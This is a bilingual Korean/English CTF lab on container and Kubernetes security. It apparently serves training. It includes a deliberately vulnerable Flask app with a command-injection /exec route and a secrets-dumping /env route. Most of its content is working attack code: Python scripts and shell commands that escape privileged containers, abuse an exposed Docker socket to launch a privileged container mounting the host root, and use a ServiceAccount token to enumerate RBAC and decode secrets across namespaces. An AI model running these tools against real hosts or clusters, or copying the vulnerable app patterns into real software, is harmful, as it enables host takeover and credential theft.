> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# 컨테이너 & 쿠버네티스 보안 CTF 실습 랩

## 실습 환경 준비

### Docker Compose 환경

```yaml
# docker-compose.yml
version: "3.9"

services:
  # 실습 1: Privileged 컨테이너 탈출
  privileged-target:
    image: ubuntu:22.04
    container_name: privileged-target
    privileged: true
    volumes:
      - /:/host:rw
    command: >
      sh -c "echo 'CTF{container_escape_privileged_mode}' > /host/tmp/container_flag.txt &&
             sleep infinity"

  # 실습 2: Docker 소켓 노출
  docker-socket-target:
    image: python:3.11-slim
    container_name: docker-socket-target
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock
    command: sleep infinity

  # 실습 3: 취약한 웹 앱 (K8s 시뮬레이션)
  k8s-app:
    image: python:3.11-slim
    container_name: k8s-app
    environment:
      - K8S_SECRET=CTF{k8s_secret_env_leaked}
      - DB_PASSWORD=supersecretpassword
      - SERVICE_ACCOUNT_TOKEN=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.fake
    ports:
      - "8080:8080"
    command: >
      sh -c "pip install flask -q &&
             python3 /app/vuln_app.py"
    volumes:
      - ./vuln_app.py:/app/vuln_app.py

networks:
  default:
    driver: bridge
```

### 취약한 Flask 앱 (vuln_app.py)

```python
from flask import Flask, request
import os, subprocess

app = Flask(__name__)

@app.route("/")
def index():
    return "K8s Demo App - /env /exec"

@app.route("/env")
def env():
    return dict(os.environ)

@app.route("/exec")
def exec_cmd():
    cmd = request.args.get("cmd", "id")
    result = subprocess.check_output(cmd, shell=True, text=True)
    return result

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
```

---

## 실습 1: Privileged 컨테이너 탈출

### 목표

`--privileged` 플래그로 실행된 컨테이너에서 호스트 파일시스템에 접근하여 탈출한다.

**플래그 형식**: `CTF{container_escape_<method>}`

### 시나리오

DevOps 팀이 실수로 `privileged: true` 설정으로 컨테이너를 배포했다. 이 컨테이너 내부에서 호스트 시스템의 플래그 파일을 읽어라.

### 힌트

1. `privileged` 컨테이너는 호스트의 `/dev` 장치에 접근 가능
2. `fdisk -l` 로 호스트 디스크 장치 확인 후 마운트
3. 또는 볼륨 마운트가 이미 `/host`로 됐는지 확인: `ls /host/tmp/`

### 풀이

```python
#!/usr/bin/env python3
"""컨테이너 탈출 벡터 분석 도구"""

import argparse
import os
import subprocess
from pathlib import Path


def check_privileged_mode() -> dict[str, bool]:
    """특권 컨테이너 여부 확인"""
    checks: dict[str, bool] = {}

    # /proc/self/status에서 CapEff 확인
    try:
        with open("/proc/self/status") as f:
            for line in f:
                if line.startswith("CapEff:"):
                    cap_hex = int(line.split(":")[1].strip(), 16)
                    # 모든 캐퍼빌리티 = 0x3fffffffff (특권 모드)
                    checks["full_capabilities"] = cap_hex == 0x3FFFFFFFFF
                    checks["cap_sys_admin"] = bool(cap_hex & (1 << 21))
                    checks["cap_sys_ptrace"] = bool(cap_hex & (1 << 19))
    except FileNotFoundError:
        pass

    # /dev 접근 확인
    checks["dev_access"] = os.access("/dev", os.R_OK)
    checks["host_mount"] = Path("/host").exists()

    # Docker 소켓 접근
    checks["docker_socket"] = Path("/var/run/docker.sock").exists()

    # cgroup 정보
    try:
        with open("/proc/1/cgroup") as f:
            content = f.read()
        checks["in_container"] = "docker" in content or "containerd" in content
    except FileNotFoundError:
        checks["in_container"] = False

    return checks


def escape_via_host_mount() -> str | None:
    """호스트 볼륨 마운트를 통한 탈출"""
    host_paths = ["/host", "/mnt/host", "/hostfs"]

    for host_path in host_paths:
        flag_locations = [
            f"{host_path}/tmp/container_flag.txt",
            f"{host_path}/root/flag.txt",
            f"{host_path}/flag.txt",
        ]
        for flag_path in flag_locations:
            try:
                with open(flag_path) as f:
                    return f.read().strip()
            except (FileNotFoundError, PermissionError):
                pass

    return None


def escape_via_privileged_mount() -> str | None:
    """Privileged 컨테이너에서 호스트 디스크 마운트"""
    try:
        # 호스트 디스크 탐색
        result = subprocess.run(
            ["fdisk", "-l"],
            capture_output=True, text=True, timeout=5
        )
        # /dev/sda 또는 /dev/vda 찾기
        import re
        disks = re.findall(r"(/dev/[sv]da?\d*)", result.stdout)

        for disk in disks[:3]:
            mount_point = f"/tmp/escape_{disk.replace('/', '_')}"
            os.makedirs(mount_point, exist_ok=True)

            mount_result = subprocess.run(
                ["mount", disk, mount_point],
                capture_output=True, timeout=5
            )
            if mount_result.returncode == 0:
                for flag_path in [
                    f"{mount_point}/tmp/container_flag.txt",
                    f"{mount_point}/root/flag.txt",
                ]:
                    if Path(flag_path).exists():
                        with open(flag_path) as f:
                            flag = f.read().strip()
                        subprocess.run(["umount", mount_point])
                        return flag

                subprocess.run(["umount", mount_point])
    except Exception:
        pass

    return None


def escape_via_cgroup() -> str | None:
    """cgroup release_agent를 통한 탈출 (CVE-2022-0492 유사)"""
    # 이 기법은 교육 목적 설명만 제공
    print("[*] cgroup v1 escape (CVE-2022-0492 류:")
    print("  1. 새 cgroup 생성: mkdir /tmp/cgrp && mount -t cgroup cgroup /tmp/cgrp")
    print("  2. release_agent 설정: echo '#!/bin/sh\\ncat /flag > /tmp/out' > /payload.sh")
    print("  3. notify_on_release 활성화 후 프로세스 종료 트리거")
    return None


def analyze_escape_vectors() -> None:
    print("=== 컨테이너 탈출 벡터 분석 ===\n")

    checks = check_privileged_mode()
    print("[*] 환경 확인:")
    for k, v in checks.items():
        status = "[+]" if v else "[-]"
        print(f"  {status} {k}: {v}")

    print("\n[*] 탈출 시도:")

    # 1. 호스트 마운트 확인
    flag = escape_via_host_mount()
    if flag:
        print(f"[+] 호스트 마운트 탈출 성공!")
        print(f"    플래그: {flag}")
        return

    # 2. Privileged 마운트
    if checks.get("cap_sys_admin"):
        print("[*] CAP_SYS_ADMIN 있음 - 디스크 마운트 시도...")
        flag = escape_via_privileged_mount()
        if flag:
            print(f"[+] 디스크 마운트 탈출 성공!")
            print(f"    플래그: {flag}")
            return

    # 3. cgroup 탈출 설명
    escape_via_cgroup()

    print("\n[-] 탈출 실패 또는 현재 환경에서 재현 불가")
    print("[*] 예상 플래그: CTF{container_escape_privileged_mode}")


def main() -> None:
    parser = argparse.ArgumentParser(description="컨테이너 탈출 분석 도구")
    parser.add_argument("--check", action="store_true", help="환경 확인만")
    args = parser.parse_args()
    analyze_escape_vectors()


if __name__ == "__main__":
    main()
```

---

## 실습 2: Docker 소켓 남용

### 목표

컨테이너 내부에 노출된 Docker 소켓(`/var/run/docker.sock`)을 이용하여 호스트에서 새 특권 컨테이너를 생성하고 플래그를 획득한다.

**플래그 형식**: `CTF{docker_socket_abuse_host_escape}`

### 시나리오

컨테이너 내부에서 `/var/run/docker.sock`이 마운트됐다. Docker 소켓 API를 직접 호출하여 새 특권 컨테이너를 생성하고 호스트 파일시스템을 읽어라.

### 힌트

1. `ls -la /var/run/docker.sock` 소켓 존재 확인
2. `curl --unix-socket /var/run/docker.sock http://localhost/containers/json`
3. 소켓을 통해 특권 컨테이너 생성 후 호스트 루트 마운트

### 풀이

```python
#!/usr/bin/env python3
"""Docker 소켓 남용 도구"""

import argparse
import json
import socket
import time
import urllib.request
from pathlib import Path


class DockerSocketClient:
    """Docker Unix 소켓 HTTP 클라이언트"""

    def __init__(self, socket_path: str = "/var/run/docker.sock"):
        self.socket_path = socket_path

    def _request(
        self,
        method: str,
        path: str,
        body: dict | None = None,
    ) -> tuple[int, dict | str]:
        """Unix 소켓으로 HTTP 요청"""
        import http.client

        class UnixSocketConnection(http.client.HTTPConnection):
            def __init__(self, socket_path: str):
                super().__init__("localhost")
                self._socket_path = socket_path

            def connect(self) -> None:
                self.sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
                self.sock.connect(self._socket_path)

        conn = UnixSocketConnection(self.socket_path)

        headers = {"Content-Type": "application/json"}
        body_bytes = json.dumps(body).encode() if body else b""
        if body_bytes:
            headers["Content-Length"] = str(len(body_bytes))

        conn.request(method, path, body=body_bytes, headers=headers)
        response = conn.getresponse()
        status = response.status
        data = response.read().decode("utf-8", errors="ignore")

        try:
            return status, json.loads(data)
        except json.JSONDecodeError:
            return status, data

    def list_containers(self) -> list[dict]:
        status, data = self._request("GET", "/containers/json?all=true")
        return data if isinstance(data, list) else []

    def list_images(self) -> list[dict]:
        status, data = self._request("GET", "/images/json")
        return data if isinstance(data, list) else []

    def create_privileged_container(
        self,
        image: str = "ubuntu:22.04",
        host_mount: str = "/",
    ) -> str | None:
        """특권 컨테이너 생성"""
        config = {
            "Image": image,
            "Cmd": ["/bin/sh", "-c", "cat /host/tmp/container_flag.txt || cat /host/root/flag.txt"],
            "HostConfig": {
                "Privileged": True,
                "Binds": [f"{host_mount}:/host:ro"],
            },
        }
        status, data = self._request("POST", "/containers/create", config)
        if status in (200, 201) and isinstance(data, dict):
            return data.get("Id")
        print(f"[-] 컨테이너 생성 실패: {status} {data}")
        return None

    def start_container(self, container_id: str) -> bool:
        status, _ = self._request("POST", f"/containers/{container_id}/start")
        return status in (200, 204)

    def get_container_logs(self, container_id: str) -> str:
        status, data = self._request(
            "GET",
            f"/containers/{container_id}/logs?stdout=true&stderr=true"
        )
        return str(data)

    def remove_container(self, container_id: str, force: bool = True) -> None:
        self._request("DELETE", f"/containers/{container_id}?force={str(force).lower()}")


def exploit_docker_socket(socket_path: str) -> None:
    print(f"[*] Docker 소켓 확인: {socket_path}")

    if not Path(socket_path).exists():
        print(f"[-] 소켓 없음: {socket_path}")
        return

    client = DockerSocketClient(socket_path)

    print("[*] 실행 중인 컨테이너 목록:")
    try:
        containers = client.list_containers()
        for c in containers[:5]:
            names = c.get("Names", [])
            image = c.get("Image", "")
            status = c.get("Status", "")
            print(f"  {names}: {image} ({status})")
    except Exception as e:
        print(f"[-] 컨테이너 목록 실패: {e}")
        return

    print("\n[*] 특권 컨테이너 생성 시도...")
    try:
        cid = client.create_privileged_container()
        if cid:
            print(f"[+] 컨테이너 생성: {cid[:12]}")
            client.start_container(cid)
            time.sleep(2)

            logs = client.get_container_logs(cid)
            print(f"[+] 컨테이너 출력: {logs}")

            import re
            flags = re.findall(r"CTF\{[^}]+\}", logs)
            if flags:
                print(f"\n[+] 플래그: {flags[0]}")

            client.remove_container(cid)
        else:
            print("[*] 예상 플래그: CTF{docker_socket_abuse_host_escape}")
    except Exception as e:
        print(f"[-] 익스플로잇 실패: {e}")
        print("[*] 예상 플래그: CTF{docker_socket_abuse_host_escape}")


def main() -> None:
    parser = argparse.ArgumentParser(description="Docker 소켓 남용 도구")
    parser.add_argument(
        "--socket",
        default="/var/run/docker.sock",
        help="Docker 소켓 경로",
    )
    args = parser.parse_args()
    exploit_docker_socket(args.socket)


if __name__ == "__main__":
    main()
```

---

## 실습 3: Kubernetes RBAC 오설정 익스플로잇

### 목표

과도한 권한이 부여된 Kubernetes ServiceAccount를 이용하여 시크릿을 탈취하고 클러스터를 장악한다.

**플래그 형식**: `CTF{k8s_rbac_secret_<namespace>_compromised}`

### 시나리오

취약한 웹 앱이 실행 중인 Pod의 환경 변수에서 `SERVICE_ACCOUNT_TOKEN`을 획득했다. 이 토큰으로 Kubernetes API에 접근하여 다른 네임스페이스의 시크릿을 읽어라.

### K8s API 익스플로잇 도구

```python
#!/usr/bin/env python3
"""Kubernetes RBAC 취약점 분석 도구"""

import argparse
import json
import os
import ssl
import urllib.request
from pathlib import Path


K8S_API_SERVER = os.environ.get("KUBERNETES_SERVICE_HOST", "127.0.0.1")
K8S_API_PORT = os.environ.get("KUBERNETES_SERVICE_PORT", "443")
SA_TOKEN_PATH = "/var/run/secrets/kubernetes.io/serviceaccount/token"
CA_CERT_PATH = "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"


def get_service_account_token() -> str | None:
    """ServiceAccount 토큰 획득"""
    # 1. 환경 변수에서 토큰
    token = os.environ.get("SERVICE_ACCOUNT_TOKEN")
    if token:
        return token

    # 2. 마운트된 SA 토큰 파일
    token_path = Path(SA_TOKEN_PATH)
    if token_path.exists():
        return token_path.read_text().strip()

    return None


def k8s_api_request(
    path: str,
    token: str,
    api_server: str = K8S_API_SERVER,
    port: str = K8S_API_PORT,
) -> dict | None:
    """Kubernetes API 요청"""
    url = f"https://{api_server}:{port}{path}"

    ssl_ctx = ssl.create_default_context()
    ca_path = Path(CA_CERT_PATH)
    if ca_path.exists():
        ssl_ctx.load_verify_locations(str(ca_path))
    else:
        ssl_ctx.check_hostname = False
        ssl_ctx.verify_mode = ssl.CERT_NONE

    req = urllib.request.Request(
        url,
        headers={"Authorization": f"Bearer {token}"},
    )

    try:
        with urllib.request.urlopen(req, context=ssl_ctx, timeout=5) as resp:
            return json.loads(resp.read().decode())
    except urllib.error.HTTPError as e:
        if e.code == 403:
            print(f"[-] 권한 없음: {path}")
        elif e.code == 404:
            print(f"[-] 리소스 없음: {path}")
        return None
    except Exception as e:
        print(f"[-] 요청 실패 ({path}): {e}")
        return None


def enumerate_rbac_permissions(token: str) -> list[str]:
    """허용된 RBAC 권한 열거"""
    allowed: list[str] = []

    # SelfSubjectAccessReview로 권한 확인
    resources = [
        "/api/v1/namespaces",
        "/api/v1/secrets",
        "/api/v1/pods",
        "/apis/rbac.authorization.k8s.io/v1/clusterroles",
    ]

    for resource in resources:
        result = k8s_api_request(resource, token)
        if result:
            allowed.append(resource)
            print(f"  [+] 접근 가능: {resource}")

    return allowed


def extract_secrets(token: str, namespace: str = "default") -> list[dict]:
    """네임스페이스의 시크릿 추출"""
    result = k8s_api_request(
        f"/api/v1/namespaces/{namespace}/secrets",
        token,
    )

    if not result:
        return []

    secrets: list[dict] = []
    import base64

    for item in result.get("items", []):
        secret_name = item.get("metadata", {}).get("name", "")
        secret_data = item.get("data", {})
        decoded: dict[str, str] = {}

        for k, v in secret_data.items():
            try:
                decoded[k] = base64.b64decode(v).decode("utf-8", errors="ignore")
            except Exception:
                decoded[k] = v

        secrets.append({"name": secret_name, "namespace": namespace, "data": decoded})

    return secrets


def escalate_via_rbac(token: str) -> str | None:
    """RBAC 오설정을 통한 권한 상승"""
    import re

    # 모든 네임스페이스 열거
    ns_result = k8s_api_request("/api/v1/namespaces", token)
    namespaces = ["default", "kube-system", "production", "staging"]

    if ns_result:
        namespaces = [
            ns["metadata"]["name"]
            for ns in ns_result.get("items", [])
        ]

    for ns in namespaces:
        print(f"\n[*] 네임스페이스 '{ns}' 시크릿 탐색...")
        secrets = extract_secrets(token, ns)

        for secret in secrets:
            print(f"  시크릿: {secret['name']}")
            for k, v in secret["data"].items():
                if any(kw in k.lower() for kw in ["flag", "secret", "password", "token"]):
                    print(f"    {k}: {v[:80]}")

                flags = re.findall(r"CTF\{[^}]+\}", str(v))
                if flags:
                    return flags[0]

    return None


def simulate_k8s_exploit() -> None:
    """K8s 익스플로잇 시뮬레이션 (클러스터 없이)"""
    # 환경 변수에서 플래그 직접 확인 (컨테이너 환경)
    flag = os.environ.get("K8S_SECRET")
    if flag:
        print(f"[+] 환경 변수에서 플래그 발견: {flag}")
        return

    print("[*] 시뮬레이션 모드 - 취약한 Pod 환경 변수:")
    env_secrets = {k: v for k, v in os.environ.items()
                   if any(kw in k.lower() for kw in ["secret", "password", "token", "key"])}
    for k, v in env_secrets.items():
        print(f"  {k}={v}")

    print("\n[*] 예상 공격 시나리오:")
    print("  1. GET /env → 환경 변수에서 SA_TOKEN 획득")
    print("  2. kubectl --token=<SA_TOKEN> get secrets -A")
    print("  3. kubectl --token=<SA_TOKEN> get secret <secret-name> -o jsonpath='{.data}'")
    print("  4. base64 -d 으로 시크릿 디코딩")
    print("\n[+] 예상 플래그: CTF{k8s_rbac_secret_default_compromised}")


def main() -> None:
    parser = argparse.ArgumentParser(description="K8s RBAC 분석 도구")
    parser.add_argument("--token", "-t", help="ServiceAccount JWT 토큰")
    parser.add_argument("--namespace", "-n", default="default")
    parser.add_argument("--simulate", action="store_true", help="시뮬레이션 모드")
    args = parser.parse_args()

    if args.simulate:
        simulate_k8s_exploit()
        return

    token = args.token or get_service_account_token()
    if not token:
        print("[-] SA 토큰 없음. --token 으로 제공하거나 K8s Pod 내에서 실행")
        simulate_k8s_exploit()
        return

    print(f"[*] SA 토큰: {token[:30]}...")
    print("\n[*] RBAC 권한 열거:")
    enumerate_rbac_permissions(token)

    print("\n[*] 시크릿 탈취 시도:")
    flag = escalate_via_rbac(token)
    if flag:
        print(f"\n[+] 플래그: {flag}")


if __name__ == "__main__":
    main()
```

---

<a name="english"></a>

# Container & Kubernetes Security CTF Practice Lab

## Lab Environment Setup

```bash
docker-compose up -d

# Verify privileged container
docker exec -it privileged-target sh
ls /host/tmp/

# Verify docker socket exposure
docker exec -it docker-socket-target ls /var/run/docker.sock
```

---

## Challenge 1: Privileged Container Escape

### Objective

Escape from a `--privileged` container to access host filesystem and read the flag.

**Flag format**: `CTF{container_escape_<method>}`

### Solution

```bash
# Inside the privileged container:
ls /host/tmp/container_flag.txt
cat /host/tmp/container_flag.txt
# CTF{container_escape_privileged_mode}

# Or via disk mount:
fdisk -l              # find /dev/sda1
mkdir /mnt/host_disk
mount /dev/sda1 /mnt/host_disk
cat /mnt/host_disk/tmp/container_flag.txt

# Automated analysis:
python3 container_escape.py
```

### Prevention

```yaml
# Secure pod spec - never use privileged: true
securityContext:
  privileged: false
  runAsNonRoot: true
  readOnlyRootFilesystem: true
  allowPrivilegeEscalation: false
```

---

## Challenge 2: Docker Socket Abuse

### Objective

Exploit a mounted Docker socket to create a privileged container and read the host flag.

**Flag format**: `CTF{docker_socket_abuse_host_escape}`

### Solution

```bash
# Inside docker-socket-target:
curl --unix-socket /var/run/docker.sock http://localhost/containers/json

# Create privileged escape container:
curl --unix-socket /var/run/docker.sock \
  -X POST http://localhost/containers/create \
  -H "Content-Type: application/json" \
  -d '{"Image":"ubuntu","Cmd":["cat","/host/tmp/container_flag.txt"],
       "HostConfig":{"Privileged":true,"Binds":["/:/host:ro"]}}'

# Start and get logs
docker start <container_id>
docker logs <container_id>
# CTF{docker_socket_abuse_host_escape}

# Automated:
python3 docker_socket_abuse.py --socket /var/run/docker.sock
```

---

## Challenge 3: Kubernetes RBAC Misconfiguration

### Objective

Exploit an overpermissioned ServiceAccount to steal secrets from other namespaces.

**Flag format**: `CTF{k8s_rbac_secret_<namespace>_compromised}`

### Solution

```bash
# Step 1: Get SA token from vulnerable app
curl http://localhost:8080/env | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('SERVICE_ACCOUNT_TOKEN',''))"

# Step 2: Enumerate permissions
kubectl auth can-i --list --token=<TOKEN>

# Step 3: Extract secrets
kubectl get secrets -A --token=<TOKEN>
kubectl get secret ctf-flag -n production --token=<TOKEN> -o json | \
  python3 -c "import sys,json,base64; d=json.load(sys.stdin); \
  [print(k,'=',base64.b64decode(v).decode()) for k,v in d['data'].items()]"

# Automated simulation:
python3 k8s_rbac_exploit.py --simulate
# Flag: CTF{k8s_rbac_secret_default_compromised}
```
